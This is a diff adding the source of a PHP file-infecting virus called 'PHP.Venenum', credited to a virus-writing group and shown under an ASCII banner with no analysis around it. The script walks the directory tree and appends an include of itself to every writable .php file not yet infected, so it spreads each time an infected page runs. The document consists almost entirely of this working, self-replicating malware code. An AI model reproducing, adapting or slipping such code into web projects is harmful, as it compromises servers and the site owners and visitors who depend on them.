@@ -1,0 +1,60 @@
+					   
+					  _             
+                     |_)  _ _|_  ._  _ 
+                     | \ (/_ |_  |  (_)              www.pugnax.co.uk
+					*************************************************
+					**                PHP.Venenum                  **
+					**             4th November 2006               **
+					*************************************************
+						          Anarchistic Sadistic
+						          
+                    <?php
+                    /* 
+                     *	Venenum.php by Retro/rRlf
+                     * 	     http://retro.host.sk 
+                     */
+
+	                    $msg = "PHP.Venenum by Retro/rRlf";
+	
+	                    function scandirectory( $path = '.', $level = 0) {
+		                    $ignore = array('cgi-bin', '.', '..', 'venenum.php');
+		
+		                    if(is_dir($path)) {
+			                    if ($dh = opendir($path)) {
+				                    while (false !== ($file = readdir($dh))) {
+					                    if (!in_array($file, $ignore)){
+						                    $spaces = str_repeat('&nbsp;', ($level * 4));
+						
+						                    if (is_dir("$path/$file")){
+							                    scandirectory("$path/$file", ($level + 1));
+						                    } else {
+							                    if (!in_array($file, $ignore)) {
+								                    if ($ext = strstr("$path/$file", ".php")) {
+									                    if (is_file("$path/$file") && is_writeable("$path/$file")) {
+										                    $thehost = fopen("$path/$file", "r");
+										                    $data = fread($thehost, filesize("$path/$file"));
+										                    $sig = strstr($data, "venenum.php");
+										                    if (preg_match ("/venenum.php/", $data)){	
+										                    } else {				
+											                    $fh = fopen("$path/$file", 'a') or die;
+											                    $string = "<?php include(\"" . __FILE__ . "\"); ?>\n";
+											                    fwrite($fh, $string);
+											                    fclose($fh);
+										                    }
+									                    }
+								                    }
+							                    }
+						                    }
+					                    }
+				                    }
+				
+				                    closedir($dh);
+			                    }
+		                    }
+	                    }
+
+	                    scandirectory(".");
+	                    echo $msg;
+                    ?>
+
+                    // Diabolus fecit, ut id facerem!
